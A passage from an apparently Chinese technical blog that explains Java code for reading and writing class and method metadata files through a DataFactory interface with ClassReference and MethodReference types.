class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据数据工厂接口解析数据到对象</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath 文件路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  工厂方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;      类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">List&lt;T&gt; <span class="title">loadData</span><span class="params">(Path filePath, DataFactory&lt;T&gt; factory)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> List&lt;String&gt; lines = Files.readLines(filePath.toFile(), StandardCharsets.UTF_8);</span><br><span class="line">    <span class="keyword">final</span> List&lt;T&gt; values = <span class="keyword">new</span> ArrayList&lt;T&gt;(lines.size());</span><br><span class="line">    <span class="keyword">for</span> (String line : lines) &#123;</span><br><span class="line">        values.add(factory.parse(line.split(<span class="string">&quot;\t&quot;</span>, -<span class="number">1</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> values;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据数据工厂接口将数据写入文件</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath 文件路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> factory  工厂方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> values   待写入的数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;      类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">saveData</span><span class="params">(Path filePath, DataFactory&lt;T&gt; factory, Collection&lt;T&gt; values)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> (BufferedWriter writer = Files.newWriter(filePath.toFile(), StandardCharsets.UTF_8)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (T value : values) &#123;</span><br><span class="line">            <span class="keyword">final</span> String[] fields = factory.serialize(value);</span><br><span class="line">            <span class="keyword">if</span> (fields == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (String field : fields) &#123;</span><br><span class="line">                <span class="keyword">if</span> (field == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    sb.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    sb.append(<span class="string">&quot;\t&quot;</span>).append(field);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            writer.write(sb.substring(<span class="number">1</span>));</span><br><span class="line">            writer.write(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后利用上面的方法实现读取类信息（classes.dat）和方法信息（methods.dat），返回存储键值的 Map，源码中多次调用用于搜索。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 classes.dat 加载类信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;ClassReference.Handle, ClassReference&gt; loadClasses() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (ClassReference classReference : loadData(Paths.get(<span class="string">&quot;classes.dat&quot;</span>), <span class="keyword">new</span> ClassReference.Factory())) &#123;</span><br><span class="line">            classMap.put(classReference.getHandle(), classReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classMap;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 methods.dat 加载方法信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, MethodReference&gt; loadMethods() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (MethodReference methodReference : loadData(Paths.get(<span class="string">&quot;methods.dat&quot;</span>), <span class="keyword">new</span> MethodReference.Factory())) &#123;</span><br><span class="line">            methodMap.put(methodReference.getHandle(), methodReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> methodMap;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-DataFactory"><a href="#2-DataFactory" class="headerlink" title="2. DataFactory"></a>2. DataFactory</h3><p>数据工厂接口，定义数据的存储格式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DataFactory</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">T <span class="title">parse</span><span class="params">(String[] fields)</span></span>;</span><br><span class="line">    String[] serialize(T obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ClassReference"><a href="#3-ClassReference" class="headerlink" title="3. ClassReference"></a>3. ClassReference</h3><p>定义<strong>类信息</strong>的描述方式，这些信息具体都使用 asm 访问者记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassReference</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;          <span class="comment">// 类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String superClass;    <span class="comment">// 父类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String[] interfaces;  <span class="comment">// 接口</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> isInterface;  <span class="comment">// 是否为接口</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Member[] members;     <span class="comment">// 字段/属性/成员</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Member</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;                  <span class="comment">// 名称</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> modifiers;                <span class="comment">// 访问修饰符</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle type;   <span class="comment">// 所属类</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Member</span><span class="params">(String name, <span class="keyword">int</span> modifiers, Handle type)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">            <span class="keyword">this</span>.modifiers = modifiers;</span><br><span class="line">            <span class="keyword">this</span>.type = type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getModifiers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> modifiers;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Handle <span class="title">getType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassReference</span><span class="params">(String name, String superClass, String[] interfaces, <span class="keyword">boolean</span> isInterface, Member[] members)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.superClass = superClass;</span><br><span class="line">        <span class="keyword">this</span>.interfaces = interfaces;</span><br><span class="line">        <span class="keyword">this</span>.isInterface = isInterface;</span><br><span class="line">        <span class="keyword">this</span>.members = members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSuperClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> superClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String[] getInterfaces() &#123;</span><br><span class="line">        <span class="keyword">return</span> interfaces;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isInterface</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isInterface;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Member[] getMembers() &#123;</span><br><span class="line">        <span class="keyword">return</span> members;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Handle <span class="title">getHandle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Handle(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Handle</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;  <span class="comment">// 类名</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Handle</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span> == o) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="keyword">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            Handle handle = (Handle) o;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> name != <span class="keyword">null</span> ? name.equals(handle.name) : handle.name == <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name != <span class="keyword">null</span> ? name.hashCode() : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义<strong>类信息</strong>的读写格式：<code>类名 父类名 接口A,接口B,接口C 是否为接口 字段1!字段1访问标志!字段1类型!字段2!字段2访问标志!字段2类型</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">ClassReference</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ClassReference <span class="title">parse</span><span class="params">(String[] fields)</span> </span>&#123;</span><br><span class="line">        String[] interfaces;</span><br><span class="line">        <span class="keyword">if</span> (fields[<span class="number">2</span>].equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            interfaces = <span class="keyword">new</span> String[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interfaces = fields[<span class="number">2</span>].split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        String[] memberEntries = fields[<span class="number">4</span>].split(<span class="string">&quot;!&quot;</span>);</span><br><span class="line">        Member[] members = <span class="keyword">new</span> Member[memberEntries.length / <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; members.length; i++) &#123;</span><br><span class="line">            members[i] = <span class="keyword">new</span> Member(memberEntries[<span class="number">3</span> * i], Integer.parseInt(memberEntries[<span class="number">3</span> * i + <span class="number">1</span>]),</span><br><span class="line">                    <span class="keyword">new</span> ClassReference.Handle(memberEntries[<span class="number">3</span> * i + <span class="number">2</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ClassReference(</span><br><span class="line">                fields[<span class="number">0</span>],</span><br><span class="line">                fields[<span class="number">1</span>].equals(<span class="string">&quot;&quot;</span>) ? <span class="keyword">null</span> : fields[<span class="number">1</span>],</span><br><span class="line">                interfaces,</span><br><span class="line">                Boolean.parseBoolean(fields[<span class="number">3</span>]),</span><br><span class="line">                members);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(ClassReference obj) &#123;</span><br><span class="line">        String interfaces;</span><br><span class="line">        <span class="keyword">if</span> (obj.interfaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            StringBuilder interfacesSb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (String iface : obj.interfaces) &#123;</span><br><span class="line">                interfacesSb.append(<span class="string">&quot;,&quot;</span>).append(iface);</span><br><span class="line">            &#125;</span><br><span class="line">            interfaces = interfacesSb.substring(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interfaces = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder members = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (Member member : obj.members) &#123;</span><br><span class="line">            members.append(<span class="string">&quot;!&quot;</span>).append(member.getName())</span><br><span class="line">                    .append(<span class="string">&quot;!&quot;</span>).append(Integer.toString(member.getModifiers()))</span><br><span class="line">                    .append(<span class="string">&quot;!&quot;</span>).append(member.getType().getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[]&#123;</span><br><span class="line">                obj.name,</span><br><span class="line">                obj.superClass,</span><br><span class="line">                interfaces,</span><br><span class="line">                Boolean.toString(obj.isInterface),</span><br><span class="line">                members.length() == <span class="number">0</span> ? <span class="keyword">null</span> : members.substring(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-MethodReference"><a href="#4-MethodReference" class="headerlink" title="4. MethodReference"></a>4. MethodReference</h3><p>定义<strong>方法信息</strong>的描述方式，同样使用 asm 访问者记录。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodReference</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle classReference; <span class="comment">// 所属类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;                          <span class="comment">// 方法名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String desc;                          <span class="comment">// 描述符</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> isStatic;                     <span class="comment">// 是否为静态方法</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MethodReference</span><span class="params">(ClassReference.Handle classReference, String name, String desc, <span class="keyword">boolean</span> isStatic)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.classReference = classReference;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">        <span class="keyword">this</span>.isStatic = isStatic;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ClassReference.<span class="function">Handle <span class="title">getClassReference</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> classReference;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isStatic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> isStatic;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Handle <span class="title">getHandle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Handle(classReference, name, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Handle</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ClassReference.Handle classReference; <span class="comment">// 所属类</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;                          <span class="comment">// 方法名</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String desc;                          <span class="comment">// 描述符</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Handle</span><span class="params">(ClassReference.Handle classReference, String name, String desc)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.classReference = classReference;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">            <span class="keyword">this</span>.desc = desc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ClassReference.<span class="function">Handle <span class="title">getClassReference</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> classReference;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> desc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span> == o) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="keyword">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            Handle handle = (Handle) o;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classReference != <span class="keyword">null</span> ? !classReference.equals(handle.classReference) : handle.classReference != <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (name != <span class="keyword">null</span> ? !name.equals(handle.name) : handle.name != <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">return</span> desc != <span class="keyword">null</span> ? desc.equals(handle.desc) : handle.desc == <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> result = classReference != <span class="keyword">null</span> ? classReference.hashCode() : <span class="number">0</span>;</span><br><span class="line">            result = <span class="number">31</span> * result + (name != <span class="keyword">null</span> ? name.hashCode() : <span class="number">0</span>);</span><br><span class="line">            result = <span class="number">31</span> * result + (desc != <span class="keyword">null</span> ? desc.hashCode() : <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义<strong>方法信息</strong>的读写格式：<code>类名 方法名 方法描述符 是否为静态方法</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> <span class="keyword">implements</span> <span class="title">DataFactory</span>&lt;<span class="title">MethodReference</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span 